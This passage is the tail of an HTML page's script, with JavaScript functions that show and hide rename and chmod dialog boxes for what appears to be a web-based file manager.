function openRenameBox(oldName){
  document.getElementById('renameOld').value=oldName;
  document.getElementById('renameNew').value=oldName;
  document.getElementById('overlay').style.display='block';
  document.getElementById('renameBox').style.display='block';
}
function closeRenameBox(){
  document.getElementById('overlay').style.display='none';
  document.getElementById('renameBox').style.display='none';
}
function openChmodBox(target,perm){
  document.getElementById('chmodTarget').value=target;
  document.getElementById('chmodPerm').value=perm;
  document.getElementById('overlay').style.display='block';
  document.getElementById('chmodBox').style.display='block';
}
function closeChmodBox(){
  document.getElementById('overlay').style.display='none';
  document.getElementById('chmodBox').style.display='none';
}

document.getElementById('overlay').onclick = function(){
  closeRenameBox();
  closeChmodBox();
};
</script>
</body>
</html>
